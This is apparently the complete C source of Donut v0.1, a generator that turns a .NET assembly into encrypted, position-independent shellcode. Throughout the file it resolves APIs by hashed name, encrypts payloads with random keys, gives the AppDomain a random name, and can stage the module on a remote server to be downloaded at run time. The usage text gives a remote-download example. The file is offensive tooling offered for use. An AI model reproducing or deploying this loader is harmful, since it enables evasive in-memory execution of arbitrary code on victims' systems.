/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "donut.h"

// these have to be in same order as structure in donut.h
static API_IMPORT api_imports[]=
{ {KERNEL32_DLL, "LoadLibraryA"},

  {KERNEL32_DLL, "VirtualAlloc"},
  {KERNEL32_DLL, "VirtualFree"},
  
  {MSCOREE_DLL,  "CLRCreateInstance"},
  
  {OLEAUT32_DLL, "SafeArrayCreate"},
  {OLEAUT32_DLL, "SafeArrayCreateVector"},
  {OLEAUT32_DLL, "SafeArrayPutElement"},
  {OLEAUT32_DLL, "SafeArrayDestroy"},
  {OLEAUT32_DLL, "SysAllocString"},
  {OLEAUT32_DLL, "SysFreeString"},
  
  {WININET_DLL,  "InternetCrackUrlA"},
  {WININET_DLL,  "InternetOpenA"},
  {WININET_DLL,  "InternetConnectA"},
  {WININET_DLL,  "InternetSetOptionA"},
  {WININET_DLL,  "InternetReadFile"},
  {WININET_DLL,  "InternetCloseHandle"},
  {WININET_DLL,  "HttpOpenRequestA"},
  {WININET_DLL,  "HttpSendRequestA"},
  {WININET_DLL,  "HttpQueryInfoA"},
  
  { NULL, NULL }
};

static GUID xCLSID_CorRuntimeHost = {
  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xIID_ICorRuntimeHost = {
  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xCLSID_CLRMetaHost = {
  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
  
static GUID xIID_ICLRMetaHost = {
  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
  
static GUID xIID_ICLRRuntimeInfo = {
  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

static GUID xIID_AppDomain = {
  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
  
// returns 1 on success else <=0
// this doesn't have to be secure.
EXPORT_FUNC int CreateRandom(void *buf, size_t len) {
    
#if defined(WINDOWS)
    HCRYPTPROV prov;
    int        ok;
    
    // 1. acquire crypto context
    if(!CryptAcquireContext(
        &prov, NULL, NULL,
        PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;

    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    
    return ok;
#else
    int      fd;
    size_t   r;
    uint8_t *p=(uint8_t*)buf;
    
    DPRINT("Opening /dev/urandom to acquire %li bytes", len);
    fd = open("/dev/urandom", O_RDONLY);
    
    if(fd > 0) {
      for(r=0; r<len; r++, p++) {
        if(read(fd, p, 1) != 1) break;
      }
      close(fd);
    }
    DPRINT("Acquired %li of %li bytes requested", r, len);
    return r == len;
#endif
}

// generate a random string, not exceeding DONUT_MAX_NAME bytes
// tbl is from https://stackoverflow.com/a/27459196
static int GenRandomString(void *output, size_t len) {
    uint8_t rnd[DONUT_MAX_NAME];
    int     i;
    char    tbl[]="HMN34P67R9TWCXYF"; 
    char    *str = (char*)output;
    
    if(len == 0 || len > (DONUT_MAX_NAME - 1)) return 0;
    
    // generate DONUT_MAX_NAME random bytes
    if(!CreateRandom(rnd, DONUT_MAX_NAME)) return 0;
    
    // generate a string using unambiguous characters
    for(i=0; i<len; i++) {
      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
    }
    str[i]=0;
    return 1;
}

// create a donut module for configuration
// returns 1 for okay, else 0
EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
    struct stat   fs;
    FILE          *fd;
    PDONUT_MODULE mod = NULL;
    size_t        len;
    char          *param;
    int           cnt;
    
    // no parameter? exit
    DPRINT("Checking configuration");
    if(c == NULL) return 0;
    
    // no file? exit
    DPRINT("Checking .NET assembly");
    if(c->file == NULL) return 0;

    // inaccessibe? exit
    DPRINT("stat(%s)", c->file);
    if(stat(c->file, &fs) != 0) return 0;

    // zero file size? exit
    if(fs.st_size == 0) return 0;

    // try open assembly
    DPRINT("Opening %s...", c->file);
    fd = fopen(c->file, "rb");

    // not opened? return
    if(fd == NULL) return 0;

    // allocate memory for module information and assembly
    len = sizeof(DONUT_MODULE) + fs.st_size;
    DPRINT("Allocating %zi bytes of memory for DONUT_MODULE", len);
    mod = calloc(len, sizeof(uint8_t));

    // if memory allocated
    if(mod != NULL) {
      // initialize domain, namespace/class, method and runtime version
      
      // if no domain name specified, generate a random string for it
      if(c->domain[0] == 0) {
        if(!GenRandomString(c->domain, 8)) return 0;
      }
    
      DPRINT("Domain  : %s", c->domain);
      mbstowcs((wchar_t*)mod->domain,  c->domain, strlen(c->domain));
      
      DPRINT("Class   : %s", c->cls);
      mbstowcs((wchar_t*)mod->cls,     c->cls,    strlen(c->cls));
      
      DPRINT("Method  : %s", c->method);
      mbstowcs((wchar_t*)mod->method,  c->method, strlen(c->method));
      
      DPRINT("Runtime : %s", DONUT_RUNTIME_NET4);
      mbstowcs((wchar_t*)mod->runtime, DONUT_RUNTIME_NET4, strlen(DONUT_RUNTIME_NET4));

      // if parameters specified
      if(c->param != NULL) {
        cnt = 0;
        // split by comma or semi-colon
        param = strtok(c->param, ",;");
        while(param != NULL && cnt < DONUT_MAX_PARAM) {
          DPRINT("Adding %s", param);
          // convert ansi string to wide character string
          mbstowcs((wchar_t*)mod->param[cnt++], param, strlen(param));
          // get next parameter
          param = strtok(NULL, ",;");
        }
        // set number of parameters
        mod->param_cnt = cnt;
      }
      // set length of assembly
      mod->len = fs.st_size;
      // read assembly into memory
      fread(&mod->data, 1, fs.st_size, fd);
    }
    // close assembly
    fclose(fd);
    // memory allocation failed? return
    if(mod == NULL) return 0;
    // update configuration with pointer to module
    c->mod     = mod;
    c->mod_len = len;
    
    return 1;
}

// create a donut instance for configuration
// returns 1 for okay, else 0
EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
    DONUT_CRYPT     inst_key, mod_key;
    PDONUT_INSTANCE inst = NULL;
    size_t          url_len, inst_len = 0;
    uint64_t        dll_hash=0, iv=0;
    int             cnt, slash=0;
    char            sig[DONUT_MAX_NAME];
    
    // no configuration or module? exit
    DPRINT("Checking configuration");
    if(c == NULL || c->mod == NULL) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    // if this is URL instance, ensure url paramter and module name
    // don't exceed DONUT_MAX_URL
    if(c->type == DONUT_INSTANCE_URL) {
      url_len = strlen(c->url);
      
      // if the end of string doesn't have a forward slash
      // add one more to account for it
      if(c->url[url_len - 1] != '/') slash++;
      
      if((url_len + DONUT_MAX_MODNAME + 1) > DONUT_MAX_URL) {
        return DONUT_ERROR_URL_LENGTH;
      }
    }
    DPRINT("Generating random IV for Maru hash");
    if(!CreateRandom(&iv, MARU_IV_LEN)) {
      return DONUT_ERROR_RANDOM;
    }
#if !defined(NOCRYPTO)
    DPRINT("Generating random key for encrypting instance");
    if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
      return DONUT_ERROR_RANDOM;
    }
    DPRINT("Generating random key for encrypting module");
    if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
      return DONUT_ERROR_RANDOM;
    }
    if(!GenRandomString(sig, 8)) {
      return DONUT_ERROR_RANDOM;
    }
    DPRINT("Generated random string for signature : %s", sig);
#endif
    // if this is a URL instance, generate a random name for module
    // that will be saved to disk
    if(c->type == DONUT_INSTANCE_URL) {
      if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
        return DONUT_ERROR_RANDOM;
      }
      DPRINT("Generated random name for module : %s", c->modname);
    }
    // calculate the size of instance based on the type
    DPRINT("Allocating space for instance");
    
    inst_len = sizeof(DONUT_INSTANCE);
    
    // if this is a PIC instance, add the size of module
    // which will be appended to the end of structure
    if(c->type == DONUT_INSTANCE_PIC) {
      DPRINT("The size of module is %i bytes. " 
             "Adding to size of instance.", c->mod_len);
      inst_len += c->mod_len;
    }
    // allocate memory
    inst = (PDONUT_INSTANCE)calloc(inst_len, 1);
    
    // if we failed? return
    if(inst == NULL) return DONUT_ERROR_NO_MEMORY;
    
#if !defined(NOCRYPTO)
    DPRINT("Setting the decryption key for instance");
    memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
    
    DPRINT("Setting the decryption key for module");
    memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
#endif
   
    DPRINT("Copying GUID structures to instance");
    memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
    memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
    memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
    memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));
    memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
    memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));

    DPRINT("Copying DLL strings to instance");
    inst->dll_cnt = 3;
    
    strncpy(inst->dll_name[0], "mscoree.dll", DONUT_MAX_NAME-1);
    strncpy(inst->dll_name[1], "oleaut32.dll",DONUT_MAX_NAME-1);
    strncpy(inst->dll_name[2], "wininet.dll" ,DONUT_MAX_NAME-1);

    DPRINT("Generating hashes for API using IV: %" PRIx64, iv);
    inst->iv = iv;
    
    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
      // calculate hash for DLL string
      dll_hash = maru(api_imports[cnt].module, iv);
      
      // calculate hash for API string.
      // xor with DLL hash and store in instance
      inst->api.hash[cnt] = maru(api_imports[cnt].name, iv) ^ dll_hash;
      
      DPRINT("Hash for %-15s : %-22s = %" PRIx64, 
        api_imports[cnt].module, 
        api_imports[cnt].name,
        inst->api.hash[cnt]);
    }
    // set how many addresses to resolve
    inst->api_cnt = cnt;

    // set the type of instance we're creating
    inst->type = c->type;

    // if the module will be downloaded
    // set the URL parameter and request verb
    if(c->type == DONUT_INSTANCE_URL) {
      DPRINT("Setting URL parameters");
      
      strcpy(inst->http.url, c->url);
      if(slash) strcat(inst->http.url, "/");
      // append module name
      strcat(inst->http.url, c->modname);
      // set the request verb
      strcpy(inst->http.req, "GET");
      
      DPRINT("Payload will attempt download from : %s", 
        inst->http.url);
    }

    inst->mod_len = c->mod_len;
    inst->len     = inst_len;
    c->inst       = inst;
    c->inst_len   = inst_len;
    
    strcpy((char*)inst->sig, sig);
    
#if !defined(NOCRYPTO)
    if(c->type == DONUT_INSTANCE_URL) {
      DPRINT("Encrypting module for download");
      
      c->mod->mac = maru(inst->sig, inst->iv);
      
      encrypt(
        mod_key.mk, 
        mod_key.ctr, 
        c->mod, 
        c->mod_len);
    }
#endif
    // if PIC, copy module to instance
    if(c->type == DONUT_INSTANCE_PIC) {
      DPRINT("Copying module data to instance");
      memcpy(&c->inst->module.x, c->mod, c->mod_len);
    }
    
#if !defined(NOCRYPTO)
    DPRINT("Encrypting instance");
    
    inst->mac = maru(inst->sig, inst->iv);
    
    uint32_t ofs = sizeof(uint32_t) + sizeof(DONUT_CRYPT);
    uint8_t *inst_data = (uint8_t*)inst + ofs;
    
    encrypt(
      inst_key.mk, 
      inst_key.ctr, 
      inst_data, 
      c->inst_len - ofs);
#endif
    return 1;
}
  
// given a configuration, create a PIC that will run from anywhere in memory
EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
    uint8_t *pl, *pld;
    size_t plen;
    int err = DONUT_ERROR_SUCCESS;
    FILE *fd;
    
    switch(c->arch) {
      case DONUT_ARCH_X86 :
        pld  = (uint8_t*)PAYLOAD_X86;
        plen = PAYLOAD_X86_SIZE;
        break;
      case DONUT_ARCH_X64 :
        pld  = (uint8_t*)PAYLOAD_X64;
        plen = PAYLOAD_X64_SIZE; 
        break;
      default:
        return DONUT_ERROR_INVALID_ARCH;
    }
    
    if(CreateModule(c)) {
      // 1. create the instance
      DPRINT("Creating instance");
      if(CreateInstance(c)) {
        // if DEBUG is defined, save instance to disk
        #ifdef DEBUG
          DPRINT("Saving instance to file");
          fd = fopen("instance", "wb");
          
          if(fd != NULL) {
            fwrite(c->inst, 1, c->inst_len, fd);
            fclose(fd);
          }
        #endif
        // 2. if this module will be stored on a remote server
        if(c->type == DONUT_INSTANCE_URL) {
          DPRINT("Saving %s to disk.", c->modname);
          // save module to disk
          fd = fopen(c->modname, "wb");
          
          if(fd != NULL) {
            fwrite(c->mod, 1, c->mod_len, fd);
            fclose(fd);
          }
        }
        // 3. calculate size of PIC + instance combined
        // allow additional space for some x86/amd64 opcodes
        c->pic_len = plen + c->inst_len + 8;
        c->pic     = malloc(c->pic_len);
        
        if(c->pic != NULL) {
          pl = (uint8_t*)c->pic;
          // for now, only x86 and amd64 are supported.
          // since the payload is written in C, 
          // adding support for ARM64 shouldn't be difficult
          if(pl != NULL) {
            *pl++ = 0xE8;                       // insert call opcode
            ((uint32_t*)pl)[0] = c->inst_len;   // insert offset to executable code
            pl += sizeof(uint32_t);             // skip 4 bytes used for offset
            // copy the instance (plus the module if attached)
            memcpy(pl, c->inst, c->inst_len);  
            pl += c->inst_len;                  // skip instance
            // we use fastcall convention for 32-bit code.
            // microsoft fastcall is used by default for 64-bit code.
            // the pointer to instance is placed in ecx/rcx
            *pl++ = 0x59;                       // insert pop ecx / pop rcx
            // copy the assembly code
            memcpy(pl, pld, plen);
          }
        } else err = DONUT_ERROR_NO_MEMORY;
      }
    }
    return err;
}

EXPORT_FUNC int ReleasePayload(PDONUT_CONFIG c) {
    
    if(c == NULL) return 0;
    
    // free module
    if(c->mod != NULL) {
      free(c->mod);
      c->mod = NULL;
    }
    // free instance
    if(c->inst != NULL) {
      free(c->inst);
      c->inst = NULL;
    }
    // free payload
    if(c->pic != NULL) {
      free(c->pic);
      c->pic = NULL;
    }
    return 1;
}

// define when building an executable
#ifdef DONUT_EXE

static char* get_param (int argc, char *argv[], int *i) {
    int n = *i;
    if (argv[n][2] != 0) {
      return &argv[n][2];
    }
    if ((n+1) < argc) {
      *i = n + 1;
      return argv[n+1];
    }
    printf("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
    exit (0);
}

static void usage (void) {
    printf("\n  usage: donut [options] -f <.NET assembly> | -u <URL hosting donut module>\n\n");
    
    printf("       -f <path>            .NET assembly to embed in PIC and DLL.\n");
    printf("       -u <URL>             HTTP server hosting the .NET assembly.\n");
    
    printf("       -c <namespace.class> The assembly class name.\n");
    printf("       -m <method>          The assembly method name.\n");
    printf("       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.\n");
    
    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64(default).\n");
    printf("       -d <name>            Domain name to create for assembly. Randomly generated by default.\n\n");

    printf(" examples:\n\n");
    printf("    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll\n");
    printf("    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/\n");
    
    exit (0);
}

int main(int argc, char *argv[]) {
    DONUT_CONFIG c;
    char         opt;
    int          i;
    FILE         *fd;
    char         *arch_str[2] = { "x86", "AMD64" };
    char         *inst_type[2]= { "PIC", "URL"   };
    
    printf("\n");
    printf("  [ Donut .NET Loader v0.1\n");
    printf("  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default type is position independent code for AMD64
    c.type = DONUT_INSTANCE_PIC;
    c.arch = DONUT_ARCH_X64;
    
    // parse arguments
    for(i=1; i<argc; i++) {
      // switch?
      if(argv[i][0] != '-' && argv[i][0] != '/') {
        usage();
      }
      opt = argv[i][1];
      
      switch(opt) {
        // target cpu architecture
        case 'a':
          c.arch   = atoi(get_param(argc, argv, &i)) - 1;
          break;
        // name of domain to use
        case 'd':
          strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME);
          break;
        // assembly to use
        case 'f':
          c.file   = get_param(argc, argv, &i);
          break;
        // url of remote assembly
        case 'u': {
          c.url    = get_param(argc, argv, &i);
          c.type   = DONUT_INSTANCE_URL;
          break;
        }
        // class
        case 'c':
          c.cls    = get_param(argc, argv, &i);
          break;
        // method
        case 'm':
          c.method = get_param(argc, argv, &i);
          break;
        // parameters to method
        case 'p':
          c.param  = get_param(argc, argv, &i);
          break;
        default:
          usage();
          break;
      }
    }
    
    // no file?
    if(c.file == NULL) {
      printf("  [ no .NET assembly specified.\n");
      usage();
    }
    
    // no class or method?
    if(c.cls == NULL || c.method == NULL) {
      printf("  [ no class or method specified.\n");
      usage();
    }
    
    if(c.arch != DONUT_ARCH_X86 && 
       c.arch != DONUT_ARCH_X64)
    {
      printf("  [ invalid architecture specified.\n");
      usage();
    }
    
    printf("  [ Instance Type : %s\n", inst_type[c.type]);
    printf("  [ .NET Assembly : %s\n", c.file  );
    printf("  [ Class         : %s\n", c.cls   );
    printf("  [ Method        : %s\n", c.method);
    printf("  [ Target CPU    : %s\n", arch_str[c.arch]);

    printf("\n  [ Creating payload...");
    
    if(CreatePayload(&c) == DONUT_ERROR_SUCCESS) {
      printf("ok.\n");
      
      if(c.type == DONUT_INSTANCE_URL) {
        printf("  [ Module name   : %s\n", c.modname);
        printf("  [ Upload to     : %s\n", c.url);
      }
      printf("  [ Saving to disk...");
      fd=fopen("payload.bin", "wb");
      
      if(fd!=NULL) {
        fwrite(c.pic, 1, c.pic_len, fd);
        fclose(fd);
        printf("ok.\n");
      } else {
        printf("failed.\n");
      }
      ReleasePayload(&c);
    }
    return 0;
}
#endif
